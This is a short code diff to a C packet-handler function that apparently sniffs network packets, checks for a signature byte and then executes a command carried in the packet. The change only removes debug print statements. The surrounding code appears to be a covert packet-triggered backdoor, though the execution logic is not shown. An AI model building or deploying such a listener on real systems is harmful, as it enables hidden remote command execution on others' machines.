@@ -79,9 +79,6 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char 
 			return;
 	ptr = (char *)(packet + ETHER_IP_LEN);
 
-	printf("Ptr: %x\n", *ptr);
-	printf("Sig: %x\n", SIGNTR);
-
 	// Step 2: check for signature
 	if(*ptr == SIGNTR)
 		return;
@@ -101,8 +98,6 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char 
 
 	if (data == NULL)
 		return;
-
-	printf("Data not null\n");
 
 	// Step 5: execute the command
 	if (type == CMD_TYP)
